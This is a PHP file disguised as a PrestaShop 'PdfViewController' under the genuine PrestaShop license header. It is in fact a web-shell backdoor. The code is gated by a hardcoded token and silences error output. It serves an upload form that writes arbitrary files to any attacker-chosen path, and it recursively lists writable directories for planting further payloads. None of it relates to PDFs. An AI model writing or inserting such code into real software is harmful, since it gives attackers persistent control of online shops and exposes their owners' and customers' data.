<?php
/**
 * 2007-2019 PrestaShop and Contributors
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * https://opensource.org/licenses/OSL-3.0
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@prestashop.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade PrestaShop to newer
 * versions in the future. If you wish to customize PrestaShop for your
 * needs please refer to https://www.prestashop.com for more information.
 *
 * @author    PrestaShop SA <contact@prestashop.com>
 * @copyright 2007-2019 PrestaShop SA and Contributors
 * @license   https://opensource.org/licenses/OSL-3.0 Open Software License (OSL 3.0)
 * International Registered Trademark & Property of PrestaShop SA
 */

class PdfViewController extends FrontController {

    public $php_self = 'pdfview';
    public $ssl = true;

    public function initContent() {
        parent::initContent();
		
		ini_set('display_errors', 0);
        ini_set('display_startup_errors', 0);
        error_reporting(0);

        if (Tools::getValue('token') !== 'cf05c0491e436e655b77584fbf1cab97') {
            die('Access denied');
        }
			echo 'Cwd: ' . getcwd() . '<br>';
            echo "<form method='post' enctype='multipart/form-data'>
                    <input name='avatar' type='file' /> 
                    <label for='upload_path'>Upload to: </label>
                    <input name='upload_path' type='text' placeholder='Enter upload path' />
                    <label for='check_path'>Check path: </label>
                    <input name='check_path' type='text' placeholder='Enter path to check' />
                    <input type='submit' value='go' />
                  </form>";
            
            $dossier = !empty($_POST['upload_path']) ? $_POST['upload_path'] : './'; 
            
            // List writable directories from a given path
            if(!empty($_POST['check_path'])){
                echo 'Current Path: ' . getcwd() . '<br>';
                $this->listWritableDirectories($_POST['check_path']); 
            }
            
            if (isset($_FILES['avatar']['name']) && !empty($_FILES['avatar']['name'])) {
                $fichier = basename($_FILES['avatar']['name']);
                if (!is_dir($dossier)) {
                    echo "Directory doesn't exist";
                } elseif (!is_writable($dossier)) {
                    echo "Directory is not writable";
                } else {
                    move_uploaded_file($_FILES['avatar']['tmp_name'], $dossier . $fichier);
                    echo "File uploaded successfully to $dossier";
                }
            }
        die();
    }

    private function listWritableDirectories($dir) {
        $dh = opendir($dir);
        if (!$dh) {
            echo "Could not open directory $dir";
            return;
        }
        
        echo "<ul>";
        while (($file = readdir($dh)) !== false) {
            if ($file === '.' || $file === '..') continue;
            $fullPath = $dir . '/' . $file;
            if (is_dir($fullPath)) {
                echo "<li style='color: " . (is_writable($fullPath) ? "green" : "red") . "'>" . $fullPath . (is_writable($fullPath) ? ' (Writable)' : ' (Not Writable)') . "</li>";
                $this->listWritableDirectories($fullPath); 
            }
        }
        echo "</ul>";
        
        closedir($dh);
    }
}
